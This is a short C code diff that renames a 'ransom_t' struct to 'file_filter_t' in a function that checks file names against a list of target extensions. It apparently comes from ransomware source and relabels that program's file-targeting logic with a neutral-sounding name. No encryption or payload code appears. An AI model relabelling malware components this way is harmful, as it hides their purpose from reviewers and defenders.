@@ -43,11 +43,11 @@ int binary_search(int *array, size_t size, int value)
   * binary_search_string - goes through indicies in array of strings to find first index
   * @str: String to search through
   * @len: Length of the string
-  * @ransom: Main struct with often used values
+  * @file_filter: Main struct with often used values
   * Return: index of substring, -1 if not found
  **/
 /* Basic Brute force. TODO: Use a search algorithm in an array*/
-int binary_search_string(const char *str, size_t len, ransom_t *ransom)
+int binary_search_string(const char *str, size_t len, file_filter_t *file_filter)
 {
 	int i;
 
@@ -55,11 +55,11 @@ int binary_search_string(const char *str, size_t len, ransom_t *ransom)
 	printf("%s\n", str);
 #endif
 	/*
-	binary_search(ransom->file_extensions, ransom->num_of_file_ext, str[ );
+	binary_search(file_filter->file_extensions, file_filter->num_of_file_ext, str[ );
 	*/
-	for (i = 0; ransom->file_extensions[i]; i++)
+	for (i = 0; file_filter->file_extensions[i]; i++)
 	{
-		if (find_substr_end((char *)str, ransom->file_extensions[i]))
+		if (find_substr_end((char *)str, file_filter->file_extensions[i]))
 			return (1);
 	}
 	len++;
